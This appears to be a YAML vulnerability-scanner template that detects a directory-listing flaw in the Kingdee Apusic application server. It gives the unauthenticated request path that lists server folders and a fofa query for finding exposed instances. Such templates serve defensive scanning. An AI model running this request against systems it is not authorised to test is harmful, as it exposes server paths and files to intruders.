expression: r0()
id: jindie-oa-apusic-server-file-traversal
info:
  author: zan8in
  description: "\u91D1\u8776Apusic\u5E94\u7528\u670D\u52A1\u5668\u662F\u56FD\u5185\
    \u7B2C\u4E00\u4E2A\u901A\u8FC7J2EE\u6D4B\u8BD5\u8BA4\u8BC1\u7684\u5E94\u7528\u670D\
    \u52A1\u5668\uFF0C\u5168\u7403\u7B2C\u56DB\u5BB6\u83B7\u5F97JavaEE 5.0\u8BA4\u8BC1\
    \u6388\u6743\u7684\u4EA7\u54C1\uFF0C\u5B8C\u5168\u5B9E\u73B0J2EE\u7B49\u4F01\u4E1A\
    \u8BA1\u7B97\u76F8\u5173\u7684\u5DE5\u4E1A\u89C4\u8303\u53CA\u6807\u51C6\u4EE3\
    \u7801\u7B80\u6D01\u4F18\u5316\uFF0C\u5177\u5907\u4E86\u6570\u636E\u6301\u4E45\
    \u6027\u3001\u4E8B\u52A1\u5B8C\u6574\u6027\u3001\u6D88\u606F\u4F20\u8F93\u7684\
    \u53EF\u9760\u6027\u3001\u96C6\u7FA4\u529F\u80FD\u7684\u9AD8\u53EF\u7528\u6027\
    \u3001\u4EE5\u53CA\u8DE8\u5E73\u53F0\u7684\u652F\u6301\u7B49\u7279\u70B9\u3002\
    \u91D1\u8776Apusic\u5E94\u7528\u670D\u52A1\u5668 server_file\u5904\u5B58\u5728\
    \u76EE\u5F55\u904D\u5386\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u53EF\u4EE5\u4ECE\
    \u5176\u4E2D\u83B7\u53D6\u7F51\u7AD9\u8DEF\u5F84\u7B49\u654F\u611F\u4FE1\u606F\
    \u8FDB\u4E00\u6B65\u653B\u51FB\u3002\nfofa\uFF1Aapp=\"Apusic-\u516C\u53F8\u4EA7\
    \u54C1\" && title==\"\u6B22\u8FCE\u4F7F\u7528Apusic\u5E94\u7528\u670D\u52A1\u5668\
    \"\n"
  name: "\u91D1\u8776OA Apusic\u5E94\u7528\u670D\u52A1\u5668(\u4E2D\u95F4\u4EF6) server_file\
    \ \u76EE\u5F55\u904D\u5386"
  reference:
  - https://mp.weixin.qq.com/s/ZTZ0XPOtSZn0Mg_ZSA1L6Q
  severity: low
  verified: true
rules:
  r0:
    expression: response.status==200 && response.body.bcontains(b'"total":') && response.body.bcontains(b'"rows":')
      && response.body.bcontains(b'"name":') && response.body.bcontains(b'"path":')
      && response.body.bcontains(b'"folder":')
    request:
      method: GET
      path: /admin/protected/selector/server_file/files?folder=/
